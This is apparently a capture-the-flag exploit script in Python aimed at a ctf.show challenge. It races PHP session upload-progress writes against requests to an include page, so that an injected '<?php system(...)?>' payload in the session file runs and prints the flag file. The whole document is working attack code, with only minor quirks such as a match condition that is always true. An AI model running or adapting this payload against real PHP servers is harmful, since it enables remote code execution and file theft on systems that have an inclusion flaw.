import io
import requests
import threading

sessID = 'test'
url = 'http://b66a28f2-928e-4d34-905a-190a2a535fdc.challenge.ctf.show:8080/'

def write(session):
    while event.isSet():
        f = io.BytesIO(b'a' * 256 * 1)
        response = session.post(
            url,
            cookies={'PHPSESSID': sessID},
            data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("tac ../flag.php");?>'},
            files={'file': ('test.txt', f)}
        )

def read(session):
    while event.isSet():
        response = session.get(url + 'upload/index.php'.format(sessID))
        if '' in response.text:
            print(response.text)
           # event.clear()
        else:
            print('[*]retrying...')


if __name__ == '__main__':
    event = threading.Event()
    event.set()
    with requests.session() as session:
        for i in range(1, 30):
            threading.Thread(target=write, args=(session,)).start()

        for i in range(1, 30):
            threading.Thread(target=read, args=(session,)).start()